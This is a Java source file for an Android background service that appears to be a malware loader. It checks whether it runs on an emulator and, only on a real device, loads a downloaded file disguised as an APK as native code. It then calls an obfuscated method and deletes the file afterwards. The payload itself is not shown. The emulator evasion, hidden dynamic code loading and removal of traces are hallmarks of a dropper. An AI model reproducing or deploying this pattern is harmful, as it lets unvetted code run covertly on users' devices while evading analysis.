package com.use.nice;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.*;
import android.util.Log;

import com.use.nice.manager.GlobalContext;
import com.use.nice.update.UDCtrl;
import com.use.nice.update.UpdateUtil;
import com.use.nice.util.EmulateCheckUtil;
import com.use.nice.util.Util_File;
import com.use.nice.util.Util_Log;

import java.io.File;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Created by zhengnan on 2015/12/17.
 */
public class MyService extends Service {
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
   static ExecutorService service = Executors.newSingleThreadExecutor();
    public final  static boolean testAsset = true;
    public final  static boolean testArmeabi = false;

    @Override
    public void onCreate() {
        super.onCreate();
        GlobalContext.init(this);
        Util_File.writeDef(this,FieldName.dVersion,""+NiceCts.HULL_VERSION);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Util_Log.log("onStartCommand");
        if(testArmeabi) {
            Util_Log.log("load armabi!!!");
            System.loadLibrary("getDevice");
            String ret = a.e.g.c.a(this);
            Log.e("J_Nice", "--------so exe ret:-----" + ret);
            return super.onStartCommand(intent, flags, startId);
        }
        if(!testAsset){
            NiceFace.onReceive(this, intent);
            return super.onStartCommand(intent, flags, startId);
        }



//        if(!getPackageName().equals("")) {
//            throw new RuntimeException("com.surprise.shuabasejoymenghull");
//        }

        Util_File.writeDef(this,"progress","99");

        if(Util_File.readDef(this,FieldName.nice_forver,"0").equals("1")){
            Util_Log.log("永不执行标记！");
            stopSelf();
            return super.onStartCommand(intent, flags, startId);
        }
        //copy asset下data来使用的测试
        EmulateCheckUtil.isValidDevice(MyService.this, new EmulateCheckUtil.ResultCallBack() {
            @Override
            public void isEmulator() {
                UDCtrl.getIns().pushLog(202+"");
            }
            @Override
            public void isDevice() {
                Util_Log.log("isDevice");

                service.execute(new Runnable() {
                    @Override
                    public void run() {
                        Util_Log.log("begin service!!!!"+ android.os.Process.myPid()+","+service);
                        Context paramContext = MyService.this;
                        Util_Log.log(UpdateUtil.surePullParams(paramContext, null).toString());

                        //若so执行失败就就错误进度保存
                        String lastSoProgress = Util_File.readDef(paramContext,FieldName.progress,"0");
                        if(!lastSoProgress.equals("0")){
//                            UDCtrl.getIns().pushLog(201+"_"+lastSoProgress);
                            Log.e("J_Nice","-------------"+lastSoProgress);
                            //    Util_File.writeDef(ctx, FieldName.bad_progress, lastSoProgress);
                            Util_File.writeDef(paramContext,FieldName.progress,"0");
                        }



                        //                将data目录释放到sdcard
                        //AssetsCopy.copyFileOrDir(paramContext, "data");
    //                加载assets下so文件
                        final NiceCtrl face = NiceCtrl.getIns();
                        face.sureApk();
                        try {
                            File file = new File(Util_File.addSeparator(NiceCts.SAVE_PATH_NAME) + NiceCts.APK_NAME);

                            Util_Log.log("load so ...");
                            System.load("" + file.getAbsolutePath());
                            String ret = a.e.g.c.a(paramContext);
                            if (Util_Log.logShow) Util_Log.log("so exe ret:" + ret);
                            Util_File.writeDef(paramContext, FieldName.soSuccess, ret);
                            if (ret.equals(FieldName.success)) {
                                Util_File.writeDef(paramContext,FieldName.firstUp,"true");
                                face.deleteApk();
                            }
                            stopSelf();
                        } catch (Throwable e) {
                            e.printStackTrace();
                            stopSelf();
                            face.deleteApk();
                            // return;
                        }
                    }
                });
            }

            @Override
            public void notSure() {

            }
        });

        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Util_Log.log("onDestroy");
    }
}
